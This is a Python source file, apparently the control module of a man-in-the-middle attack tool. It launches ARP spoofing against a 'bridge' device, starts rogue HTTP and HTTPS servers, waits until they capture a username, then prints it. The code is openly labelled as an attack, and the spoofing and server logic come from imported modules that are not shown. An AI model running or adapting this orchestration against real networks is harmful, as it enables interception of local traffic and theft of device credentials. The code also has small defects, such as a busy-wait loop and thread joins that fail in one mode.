import threading
import time

import requests

from Functions import clear
from arp_spoofing import ArpSpoof
import http_server as http_server


class Execution(threading.Thread):

    def __init__(self, mode):
        super().__init__()
        self.mode = mode

        self.arp = None
        self.ipBridge = None
        self.ipAttacker = None

        self.username = None

        self.arp_thread = None
        self.http_thread = None
        self.https_thread = None

        return

    def setup(self):
        # todo
        print("SETUP")
        print("===============")

        self.arp = ArpSpoof()
        self.ipBridge = self.arp.ipBridge
        self.ipAttacker = self.arp.ipAttacker

        return

    def run(self):
        clear()
        print("===============")
        print("Starting attack")
        print("===============")
        self.setup()

        time.sleep(1)

        if self.mode >= 0:
            self.do_arp_posioning()

        if self.mode >= 1:
            self.do_more()

        self.finalize()
        print("===============")
        print("Username: " + str(self.username))
        print("===============")
        print("Attack ended")
        print("===============")

    def do_arp_posioning(self):
        print("start")
        self.arp_thread = threading.Thread(target=self.arp.spoof)
        self.arp_thread.start()
        return

    def do_more(self):
        self.http_thread = threading.Thread(target=http_server.run_http)
        self.https_thread = threading.Thread(target=http_server.run_https)

        self.http_thread.start()
        self.https_thread.start()

        while True:
            if http_server.username:
                self.username = http_server.username
                break
        print("And more!")
        return

    def finalize(self):
        print("end")
        self.arp.stop_threads = True
        self.arp_thread.join()

        http_server.stop_threads = True

        try:
            requests.head("http://" + self.ipAttacker)
            requests.head("https://" + self.ipAttacker)
        except:
            print("Something went wrong, but it is not a problem")

        self.http_thread.join()
        self.https_thread.join()
        print("Threads killed")
        return
